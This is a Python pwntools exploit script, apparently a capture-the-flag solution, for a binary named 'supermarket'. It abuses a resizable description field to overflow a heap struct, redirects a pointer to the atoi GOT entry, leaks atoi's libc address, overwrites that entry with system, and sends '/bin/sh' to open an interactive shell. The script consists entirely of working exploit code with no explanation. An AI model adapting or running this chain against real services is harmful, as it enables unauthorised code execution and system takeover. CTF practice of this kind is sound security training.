#!/usr/bin/env python
from pwn import *
context.log_level = "debug"
context.update(os = 'linux', arch = 'i386')
p = process("./supermarket")
#  p = remote("111.198.29.45",51423)
elf = ELF("./supermarket")
libc = ELF("libc.so.6")
def add(name,price,size,des):
    p.sendlineafter(">> ","1")
    p.sendlineafter("name:",name)
    p.sendlineafter("price:",str(price))
    p.sendlineafter("descrip_size:",str(size))
    p.sendlineafter("description:",des)
def listall():
    p.sendlineafter(">> ","3")
def delete(name):
    p.sendlineafter(">> ","2")
    p.sendlineafter("name:",name)
def change_price(name,price):
    p.sendlineafter(">> ","4")
    p.sendafter("name:",name)
    p.sendlineafter("in:",str(price))
def change_des(name,size,des):
    p.sendlineafter(">> ","5")
    p.sendlineafter("name:",name)
    p.sendlineafter("descrip_size:",str(size))
    p.sendlineafter("description:",des)

add("ipad",200,0x80,"a"*0x80)
add("iphone8",999,0x40,"b"*0x40)
change_des("ipad",0xa0,"")
add("mac",100,0x50,"d"*0x50)
payload = p32(0x0063616d) + p32(0xf7faf830) + "a"*8 + p32(64) + p32(0x50) + p32(elf.got['atoi'])
change_des("ipad",0x30,payload)
listall()
p.recvuntil("64, des.")
data = u32(p.recv(4))
print hex(data)
# leak = data
# libc = LibcSearcher('atoi',leak)
system_addr = libc.symbols['system'] + data - libc.symbols['atoi']
change_des("mac",0x50,p32(system_addr))
print hex(system_addr)
p.recv()
p.sendline("/bin/sh")
# gdb.attach(p)
p.interactive()
